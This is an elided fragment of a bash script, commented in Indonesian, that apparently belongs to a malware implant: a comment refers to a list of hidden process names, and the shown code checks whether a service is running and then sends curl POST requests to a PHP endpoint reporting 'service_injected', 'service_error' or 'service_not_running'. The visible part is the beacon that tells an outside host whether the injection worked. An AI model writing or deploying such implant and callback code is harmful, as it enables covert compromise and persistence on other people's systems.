...
# Daftar nama proses yang disembunyikan
...
# Cek status layanan dan kirim log melalui endpoint PHP
...
if echo "$status_output" | grep -q "active (running)"; then
    if ! echo "$status_output" | grep -q "Failed"; then
        curl -sL -H "Content-Type: application/json" -X POST "$php_endpoint?status=service_injected"
    else
        curl -sL -H "Content-Type: application/json" -X POST "$php_endpoint?status=service_error"
    fi
else
    curl -sL -H "Content-Type: application/json" -X POST "$php_endpoint?status=service_not_running"
fi
